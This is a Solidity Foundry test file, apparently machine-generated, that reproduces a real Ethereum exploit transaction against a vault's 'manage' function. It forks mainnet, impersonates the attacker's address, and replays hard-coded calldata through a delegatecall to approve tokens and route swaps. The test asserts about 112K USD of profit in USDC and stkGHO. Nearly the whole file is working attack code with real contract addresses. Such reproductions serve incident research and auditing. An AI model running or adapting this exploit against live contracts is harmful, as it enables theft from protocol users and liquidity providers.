// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x5c28b54e7e1f9aafbdc5c563c1a460106f41bd58
// Attack Contract : 0x0000000f2eb9f69274678c76222b35eec7588a65
// Vulnerable Contract : 0x0000000f2eb9f69274678c76222b35eec7588a65
// Attack Tx : 0x6aff59e800dc219ff0d1614b3dc512e7a07159197b2a6a26969a9ca25c3e33b4
// Block : 24218806
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 112.01K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.TransparentUpgradeableProxy_000000;
    uint256 constant FORK_BLOCK = 24218805;
    uint256 constant TX_TIMESTAMP = 1768222979;
    uint256 constant TX_BLOCK_NUMBER = 24218806;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x224d8703));
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.TransparentUpgradeableProxy_000000, attack, Addresses.USDC, "USDC", 112036126440);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.stkGHO, "stkGHO", 16825758092977224691385);
    }
}

contract OurAttack {
    function _yoVaultManage() internal {
        bytes memory yoVaultManageCall =
            hex"224d8703000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000082000000000000000000000000000000000000000000000000000000000000000020000000000000000000000001a88df1cfe15af22b3c4c783d4e6f7f9e0c1885d000000000000000000000000cf5540fffcdc3d510b18bfca6d2b9987b07725590000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000044095ea7b3000000000000000000000000cf5540fffcdc3d510b18bfca6d2b9987b0772559000000000000000000000000000000000000000000032d4a2123693a90eeb6b800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065883bd37f900011a88df1cfe15af22b3c4c783d4e6f7f9e0c1885d0001a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480b032d4a2123693a90eeb6b8051a15df9ee80147ae0001365084b05fa7d5028346bd21d842ed0601bab5b8000000010000000f2eb9f69274678c76222b35eec7588a65000000002f190f2301018a0e710e01000102010cf85000426800010943a04e0e01000102010493e0001770000100f669190e01000102010c3500003e800001007d4eb20e010001020103d09000138800010059af570e0100010201009c4000032000010046c9980e010001020100753000025800010075d6b70e01000102010061a80001f400010b55ba1d0e020001030107a120002710000101daabcb0e02000103010249f0000bb8000100170abb0e02000103010186a00007d00001007f4bf70e02000103010184ac0007c600010044d8ca0e0200010301010dec0005660001007d086e0e02000103010182b80007bc0001031bb5510e02000103010d1f60004330000103786b2c0e02000103010d23480043440001fd8da5810e03000104000d6d800044c000001b0400010501010754625b49000007755e0e2406050107002c3fca410600060407070760962d0e07000408010000640000010007003df0b00e0800040901000bb800003c000798914fdc0e0900040a010001f400000a0007a007ece30e0900040a010000640000010007042e15ce0e0900040a01000bb800003c0007fda471ef0e0a00040b010001f400000a000782bae19e0e0b00040c010027100000c800060e0c00040d01000bb800003c0003b7796021000303045e2397670d00010e02000102670e100110020001080d09001112010c4102001307030668020014020315161c670200000f1701000b00e0766f570200011812007fffffc40b5afa97f80d02001912000b63ce8add0d02001a12000bd3cddcce0d02001b12000b971c64390d02001c12000b2ff42b510e0200120300000064000001000a0e02001203000001f400000a00100d02001d090115e0884e440d02001e0b01152cc2e95b0e02000b03010001f400000a001455021f0b030100160e02000c03010001f400000a001a0e0200200301000064000001000e0e0200080300000064000001001300decad30e02000a03000000080000010012690200210a00013c2e98ff0e02000403010001f400000a0001249414d90e02000403010000640000010000690200220400180e02000d0301000bb800003c00040203ff000000000000000000001a88df1cfe15af22b3c4c783d4e6f7f9e0c1885d40d16fc0246ad3160ccc09b8d0d3a2cd28ae6c2fa0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000b23243cefe2718aa2a87221430e9f0736569b81eb1cd6e4153b2a390cf00a6556b0fc1458c4a55331f573d6fb3f13d689ff844b4ce37794d79a7ff1ccfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a6b175474e89094c44da98b954eedeac495271d0fdac17f958d2ee523a2206206994597c13d831ec72260fac5e5542a773aa44fbcfedf7c193bc2c5991abaea1f7c830bd89acc67ec4af516284b1bc33c1f9840a85d5af5bf1d1762f925bdaddc4201f9844628f13651ead6793f8d838b34b8f8522fb0cc525018be882dcce5e3f2f3b0913ae2096b9b3fb61f74345504eaea3d9408fc69ae7eb2d14095643c5bc7bbec68d12a0d1830360f8ec58fa599ba1b0e9bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2874d8de5b26c9d9f6aa8d7bab283f9a9c6f777f485b2b559bc2d21104c4defdd6efca8a20343361dc71ea051a5f82c67adcf634c36ffe6334793d24cd4fa2d31b7968e448877f69a96de69f5de8cd23e085780639cc2cacd35e474e71f4d000e2405d8f6eb1da432d5c1a9fdf52aa5d37698f34706f913971445f32d1a74872ba41f3d8cf4022e9996120b3188e6a0c2ddd26feeb64f039a2c41296fcb3f5640e0554a476a092703abdb3ef35c80e0d76d32939f1ac1a8feaaea1900c4166deeed0c11cc10669d365777d92f208679db4b9778590fa3cab3ac9e21689a772018fbd77fcd2d25657e5c547baff3fd7d167f86bf177dd4f3494b841a37e810a34dd56c829b66a1e37c9b0eaddca17d3662d6c05f4decf3e110667701e51b4d1ca244f17c78f7ab8744b4c99f9b836951eb21f3df98273517b7249dceff270d34bf0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        (bool ok,) = Addresses.YoVault_V2.delegatecall(yoVaultManageCall);
        require(ok, "YoVault manage delegatecall failed");
    }

    receive() external payable {}

    function yoVaultManageReturn(
        address[] calldata managedTargets,
        bytes[] calldata managedCalls,
        uint256[] calldata callValues
    ) external payable {
        managedTargets;
        managedCalls;
        callValues;
        _yoVaultManage();
        bytes memory ret = abi.encode(
            uint256(32),
            uint256(2),
            uint256(64),
            uint256(128),
            uint256(32),
            uint256(1),
            uint256(32),
            uint256(112036126440)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == bytes4(0x224d8703)) {
            _yoVaultManage();
            return;
        }
        _acceptCallback();
    }

    function _acceptCallback() internal {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PoolManager = 0x000000000004444c5dc75cB358380D2e3dE08A90; // Addresses.PoolManager = 0x000000000004444c5dc75cb358380d2e3de08a90 label=PoolManager roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant TransparentUpgradeableProxy_000000 = 0x0000000f2eB9f69274678c76222B35eEc7588a65; // Addresses.TransparentUpgradeableProxy_000000 = 0x0000000f2eb9f69274678c76222b35eec7588a65 label=TransparentUpgradeableProxy roles=attacker_contract|attacker_entry_contract|code_contract|contract|economic_holder|localized_contract|observed_address|profit_holder|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant fxUSD = 0x085780639CC2cACd35E474e71f4d000e2405d8f6; // Addresses.fxUSD = 0x085780639cc2cacd35e474e71f4d000e2405d8f6 label=TransparentUpgradeableProxy token_symbol=fxUSD roles=asset|contract|observed_address|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant ProxyAdmin = 0x12E81209d180fF0b3FBFbfe8fA9fFdb5990e1073; // Addresses.ProxyAdmin = 0x12e81209d180ff0b3fbfbfe8fa9ffdb5990e1073 label=ProxyAdmin roles=observed_address source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool = 0x1445F32D1A74872bA41f3D8cF4022E9996120b31; // Addresses.PancakeV3Pool = 0x1445f32d1a74872ba41f3d8cf4022e9996120b31 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FxUSDRegeneracy = 0x1a144095AD1cb488fE6378DbfC62368A7453D114; // Addresses.FxUSDRegeneracy = 0x1a144095ad1cb488fe6378dbfc62368a7453d114 label=FxUSDRegeneracy roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant stkGHO = 0x1a88Df1cFe15Af22B3c4c783D4e6F7F9e0C1885d; // Addresses.stkGHO = 0x1a88df1cfe15af22b3c4c783d4e6f7f9e0c1885d label=TransparentUpgradeableProxy token_symbol=stkGHO roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant EURC = 0x1aBaEA1f7C830bD89Acc67eC4af516284b1bC33c; // Addresses.EURC = 0x1abaea1f7c830bd89acc67ec4af516284b1bc33c label=FiatTokenProxy token_symbol=EURC roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant PancakeV3Pool_9D36 = 0x1ac1A8FEaAEa1900C4166dEeed0C11cC10669D36; // Addresses.PancakeV3Pool_9D36 = 0x1ac1a8feaaea1900c4166deeed0c11cc10669d36 label=PancakeV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant BNT = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C; // Addresses.BNT = 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c label=SmartToken token_symbol=BNT roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // Addresses.UNI = 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984 label=Uni token_symbol=UNI roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // Addresses.WBTC = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599 label=WBTC token_symbol=WBTC roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant A_23D1B2_13EB = 0x23d1b2755d6C243DFa9Dd06624f1686b9c9E13EB; // Addresses.A_23D1B2_13EB = 0x23d1b2755d6c243dfa9dd06624f1686b9c9e13eb label=unresolved roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_26ABC4_7C2E = 0x26ABC40164Bb5A304eB2d1b30DfD946d424D7C2E; // Addresses.A_26ABC4_7C2E = 0x26abc40164bb5a304eb2d1b30dfd946d424d7c2e label=unresolved roles=asset|contract source=unresolved confidence=low
    address internal constant A_2E4015_46AD = 0x2e4015880367b7C2613Df77f816739D97A8C46aD; // Addresses.A_2E4015_46AD = 0x2e4015880367b7c2613df77f816739d97a8c46ad label=unresolved roles=code_contract source=unresolved confidence=low
    address internal constant BancorNetwork = 0x2F9EC37d6CcFFf1caB21733BdaDEdE11c823cCB0; // Addresses.BancorNetwork = 0x2f9ec37d6ccfff1cab21733bdadede11c823ccb0 label=BancorNetwork roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_365084_B5B8 = 0x365084B05Fa7d5028346bD21D842eD0601bAB5b8; // Addresses.A_365084_B5B8 = 0x365084b05fa7d5028346bd21d842ed0601bab5b8 label=unresolved roles=code_contract|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant GHO = 0x40D16FC0246aD3160Ccc09B8D0D3A2cD28aE6C2f; // Addresses.GHO = 0x40d16fc0246ad3160ccc09b8d0d3a2cd28ae6c2f label=GhoToken token_symbol=GHO roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd; // Addresses.FiatTokenV2_2 = 0x43506849d7c04f9138d1a2050bbf3a0c054402dd label=FiatTokenV2_2 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant GHOUSR = 0x4628f13651eaD6793F8d838B34B8f8522Fb0cc52; // Addresses.GHOUSR = 0x4628f13651ead6793f8d838b34b8f8522fb0cc52 label=CurveStableSwapNG token_symbol=GHOUSR roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDCfxUSD = 0x5018BE882DccE5E3F2f3B0913AE2096B9b3fB61f; // Addresses.USDCfxUSD = 0x5018be882dcce5e3f2f3b0913ae2096b9b3fb61f label=CurveStableSwapNG token_symbol=USDCfxUSD roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant StakeToken = 0x50F9d4E28309303F0cdcAc8AF0b569e8b75Ab857; // Addresses.StakeToken = 0x50f9d4e28309303f0cdcac8af0b569e8b75ab857 label=StakeToken roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant FluidLiquidityProxy = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497; // Addresses.FluidLiquidityProxy = 0x52aa899454998be5b000ad077a46bbe360f4e497 label=FluidLiquidityProxy roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168; // Addresses.UniswapV3Pool = 0x5777d92f208679db4b9778590fa3cab3ac9e2168 label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x5C28b54E7e1f9aafbdc5c563C1a460106f41Bd58; // Addresses.attacker_eoa = 0x5c28b54e7e1f9aafbdc5c563c1a460106f41bd58 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant FluidDexT1 = 0x667701e51B4D1Ca244F17C78F7aB8744B4C99F9B; // Addresses.FluidDexT1 = 0x667701e51b4d1ca244f17c78f7ab8744b4c99f9b label=FluidDexT1 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USR = 0x66a1E37c9b0eAddca17d3662D6c05F4DECf3e110; // Addresses.USR = 0x66a1e37c9b0eaddca17d3662d6c05f4decf3e110 label=TransparentUpgradeableProxy token_symbol=USR roles=asset|contract|observed_address|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // Addresses.DAI = 0x6b175474e89094c44da98b954eedeac495271d0f label=Dai token_symbol=DAI roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant fxUSDGHO = 0x74345504Eaea3D9408fC69Ae7EB2d14095643c5b; // Addresses.fxUSDGHO = 0x74345504eaea3d9408fc69ae7eb2d14095643c5b label=CurveStableSwapNG token_symbol=fxUSDGHO roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant crvUSDCWBTCWETH = 0x7F86Bf177Dd4F3494b841a37e810A34dD56c829B; // Addresses.crvUSDCWBTCWETH = 0x7f86bf177dd4f3494b841a37e810a34dd56c829b label=CurveTricryptoOptimizedWETH token_symbol=crvUSDCWBTCWETH roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FluidDexT1_34BF = 0x836951EB21F3Df98273517B7249dCEFF270d34bf; // Addresses.FluidDexT1_34BF = 0x836951eb21f3df98273517b7249dceff270d34bf label=FluidDexT1 roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant StablePool = 0x85B2b559bC2D21104C4DEFdd6EFcA8A20343361D; // Addresses.StablePool = 0x85b2b559bc2d21104c4defdd6efca8a20343361d label=StablePool roles=observed_address source=etherscan_v2 confidence=high
    address internal constant PancakeV3LmPool = 0x86e9Bd5E42a9AFdE8d9C2594E84E49CC7718f381; // Addresses.PancakeV3LmPool = 0x86e9bd5e42a9afde8d9c2594e84e49cc7718f381 label=PancakeV3LmPool roles=asset|contract source=etherscan_v2 confidence=high
    address internal constant DSToken = 0x874d8dE5b26c9D9f6aA8d7bab283F9A9c6f777f4; // Addresses.DSToken = 0x874d8de5b26c9d9f6aa8d7bab283f9a9c6f777f4 label=DSToken roles=observed_address source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_5640 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640; // Addresses.UniswapV3Pool_5640 = 0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640 label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant RolesAuthority = 0x9524e25079b1b04D904865704783A5aA0202d44D; // Addresses.RolesAuthority = 0x9524e25079b1b04d904865704783a5aa0202d44d label=RolesAuthority roles=observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_7D16 = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16; // Addresses.UniswapV3Pool_7D16 = 0x9a772018fbd77fcd2d25657e5c547baff3fd7d16 label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant YoVault_V2 = 0xAAE23050e5BaD7f0024a0F73b8C890368AFf912D; // Addresses.YoVault_V2 = 0xaae23050e5bad7f0024a0f73b8c890368aff912d label=YoVault_V2 roles=code_contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant SmartToken = 0xb1CD6e4153B2a390Cf00A6556b0fC1458C4A5533; // Addresses.SmartToken = 0xb1cd6e4153b2a390cf00a6556b0fc1458c4a5533 label=SmartToken roles=observed_address source=etherscan_v2 confidence=high
    address internal constant DPPAdvanced = 0xb23243CEFE2718Aa2a87221430e9F0736569b81E; // Addresses.DPPAdvanced = 0xb23243cefe2718aa2a87221430e9f0736569b81e label=DPPAdvanced roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant Vault_BA1333 = 0xbA1333333333a1BA1108E8412f11850A5C319bA9; // Addresses.Vault_BA1333 = 0xba1333333333a1ba1108e8412f11850a5c319ba9 label=Vault roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Addresses.WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 label=WETH9 token_symbol=WETH roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant TransparentUpgradeableProxy_C71EA0 = 0xC71Ea051a5F82c67ADcF634c36FFE6334793D24C; // Addresses.TransparentUpgradeableProxy_C71EA0 = 0xc71ea051a5f82c67adcf634c36ffe6334793d24c label=TransparentUpgradeableProxy roles=observed_address source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_0E9B = 0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b; // Addresses.UniswapV3Pool_0E9B = 0xc7bbec68d12a0d1830360f8ec58fa599ba1b0e9b label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant OdosRouterV2 = 0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559; // Addresses.OdosRouterV2 = 0xcf5540fffcdc3d510b18bfca6d2b9987b0772559 label=OdosRouterV2 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ADS = 0xcfcEcFe2bD2FED07A9145222E8a7ad9Cf1Ccd22A; // Addresses.ADS = 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a label=WrappedADS token_symbol=ADS roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant TransparentUpgradeableProxy_D4FA2D = 0xD4fa2D31b7968E448877f69A96DE69f5de8cD23E; // Addresses.TransparentUpgradeableProxy_D4FA2D = 0xd4fa2d31b7968e448877f69a96de69f5de8cd23e label=TransparentUpgradeableProxy roles=observed_address source=etherscan_v2 confidence=high
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // Addresses.USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7 label=TetherToken token_symbol=USDT roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool_939F = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F; // Addresses.UniswapV3Pool_939F = 0xe0554a476a092703abdb3ef35c80e0d76d32939f label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant StandardPoolConverter = 0xe331821bc94187c2649E932810A60204699d45cB; // Addresses.StandardPoolConverter = 0xe331821bc94187c2649e932810a60204699d45cb label=StandardPoolConverter roles=asset|code_contract|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_EB1DA4_1397 = 0xEB1da432D5C1a9FDF52aA5D37698f34706F91397; // Addresses.A_EB1DA4_1397 = 0xeb1da432d5c1a9fdf52aa5d37698f34706f91397 label=unresolved roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_EEEEEE_EEEE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; // Addresses.A_EEEEEE_EEEE = 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee label=unresolved roles=observed_address source=unresolved confidence=low
    address internal constant SimpleToken = 0xEf4c4bcbE105170810B6Ef58A286d9CE97a1fABE; // Addresses.SimpleToken = 0xef4c4bcbe105170810b6ef58a286d9ce97a1fabe label=SimpleToken roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=observed_address source=unresolved confidence=low
}

interface IOdosRouterV2 {
    function swapCompact() external returns (uint256);
}

interface IRolesAuthority {
    function canCall(address, address, bytes4) external view returns (uint256);
}

interface ITransparentUpgradeableProxy_000000 {
    function manage(address[] calldata, bytes[] calldata, uint256[] calldata) external payable;
}
